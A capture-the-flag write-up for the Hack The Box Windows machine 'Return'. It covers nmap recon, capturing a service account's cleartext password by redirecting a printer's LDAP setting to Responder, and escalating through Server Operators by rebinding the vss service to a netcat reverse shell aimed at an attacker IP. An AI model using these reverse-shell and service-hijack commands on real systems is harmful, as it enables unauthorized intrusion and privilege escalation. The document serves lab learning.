---
title: Return
date: 2026-09-04
description: Easy Windows AD box pointing a printer's LDAP server setting at responder for a cleartext password, then abusing Server Operators to rebinpath the VSS service onto netcat.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Fri Sep  4 08:18:01 2026 as: /usr/lib/nmap/nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49681,49694,59035 -A -oN scan_results.txt 10.129.95.241
Nmap scan report for return.htb (10.129.95.241)
Host is up (0.51s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-04 12:44:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
59035/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2012|2022|2016|Longhorn (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows 10 1909 (92%), Microsoft Windows Server 2019 (91%), Microsoft Windows 10 1909 - 2004 (89%), Microsoft Windows 10 20H2 (89%), Windows Server 2019 (89%), Microsoft Windows Server 2012 R2 (88%), Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2016 (87%), Microsoft Windows 10 20H2 - 21H1 (86%), Microsoft Windows 10 21H2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-04T12:45:40
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 26m00s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   449.99 ms 10.10.16.1
2   450.06 ms return.htb (10.129.95.241)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  4 08:20:00 2026 -- 1 IP address (1 host up) scanned in 119.80 seconds

```

Port 445 is open with guest login working, and port 80 serves a **printer admin panel**.

# User

The settings page lets us configure the LDAP **server address** — telling the printer where to connect back to.

Update it to our attack machine IP and click update, with responder running first:

```sh
responder -i tun0
```

**Responder** grabbed the LDAP request in clear text, handing over the credentials for **svc-printer**:

> `svc-printer - 1edFg43012!!`

User shell through **evil-winrm**.

# Root

```powershell
whoami /all
```

Two things worth noting — group membership and privileges:

- **Server Operators** — built-in group with access to start and stop services
- **SeBackupPrivilege** — can back up anything

Copying the hash out through the registry didn't work, though.

---
#### Note :
**VSS** is a **Windows service**. It creates snapshots of files in real-time, allowing you to restore deleted or corrupted files to previous versions without stopping running applications.

**sc.exe** is the **Service Control Manager** command-line tool in **Windows**. It allows you to create, delete, start, stop, and manage Windows services from the command prompt or PowerShell.

---

Upload **netcat** to the target:

```powershell
upload /usr/share/windows-resources/binaries/nc.exe
```

**Set the path** so the `vss` service maps to `netcat` — from then on, triggering vss executes `netcat`:

```powershell
sc.exe config vss binPath="C:\temp\nc.exe -e cmd.exe 10.10.16.82 9002
```

Now **stop** the `vss` service and **start** it again — a shell lands on the listener:

```powershell
sc.exe stop vss

sc.exe start vss
```

Gained `root`
